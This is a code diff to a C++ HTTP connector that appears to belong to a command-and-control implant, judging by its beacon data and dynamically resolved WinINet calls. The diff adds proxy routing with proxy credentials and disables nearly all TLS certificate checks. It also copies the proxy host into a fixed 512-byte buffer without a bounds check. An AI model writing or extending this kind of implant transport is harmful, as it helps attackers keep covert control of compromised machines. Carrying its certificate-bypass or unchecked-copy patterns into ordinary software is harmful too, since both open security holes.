@@ -130,6 +130,13 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 	this->ans_size		 = profile.ans_size;
 	this->ans_pre_size   = profile.ans_pre_size;
 
+	// Set proxy configuration
+	this->proxy_type     = profile.proxy_type;
+	this->proxy_host     = (CHAR*) profile.proxy_host;
+	this->proxy_port     = profile.proxy_port;
+	this->proxy_username = (CHAR*) profile.proxy_username;
+	this->proxy_password = (CHAR*) profile.proxy_password;
+
 	return TRUE;
 }
 
@@ -146,8 +153,50 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 	while ( !connected && attempt < this->server_count) {
 		DWORD dwError = 0;
 
-		if (!this->hInternet)
-			this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
+		if (!this->hInternet) {
+			// Check if proxy is configured
+			if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_host != NULL && _strlen(this->proxy_host) > 0) {
+				// Build proxy string: "http=http://host:port https=http://host:port" for HTTP proxy
+				// or "http=https://host:port https=https://host:port" for HTTPS proxy
+				CHAR proxyString[512];
+				ULONG idx = 0;
+				
+				// For HTTP proxy type, format is: "host:port"
+				// For HTTPS proxy type (CONNECT tunnel), format is: "https=host:port http=host:port"
+				ULONG hostLen = _strlen(this->proxy_host);
+				
+				// Convert port to string
+				WORD port = this->proxy_port;
+				CHAR portStr[6];
+				int portIdx = 0;
+				if (port == 0) {
+					portStr[portIdx++] = '0';
+				} else {
+					CHAR temp[6];
+					int tempIdx = 0;
+					while (port > 0) {
+						temp[tempIdx++] = '0' + (port % 10);
+						port /= 10;
+					}
+					// Reverse
+					for (int i = tempIdx - 1; i >= 0; i--) {
+						portStr[portIdx++] = temp[i];
+					}
+				}
+				portStr[portIdx] = 0;
+				
+				// Simple format: "host:port" works for both HTTP and HTTPS targets through HTTP proxy
+				memcpy(proxyString, this->proxy_host, hostLen);
+				idx = hostLen;
+				proxyString[idx++] = ':';
+				memcpy(proxyString + idx, portStr, portIdx + 1);
+				
+				this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_PROXY, proxyString, NULL, 0 );
+			} else {
+				// No proxy, use system default
+				this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
+			}
+		}
 		if ( this->hInternet ) {
 
 			if ( !this->hConnect )
@@ -164,12 +213,21 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 				HINTERNET hRequest = this->functions->HttpOpenRequestA( this->hConnect, this->http_method, this->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context );
 				if (hRequest) {
 					if (this->ssl) {
-						DWORD dwFlags;
+						DWORD dwFlags = 0;
 						DWORD dwBuffer = sizeof(DWORD);
 						result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
-						if (result) {
-							dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
-							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+						if (!result) {
+							dwFlags = 0;
+						}
+						dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
+						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+					}
+
+					// Set proxy authentication if configured
+					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL && _strlen(this->proxy_username) > 0) {
+						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, _strlen(this->proxy_username));
+						if (this->proxy_password != NULL && _strlen(this->proxy_password) > 0) {
+							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_PASSWORD, this->proxy_password, _strlen(this->proxy_password));
 						}
 					}
 
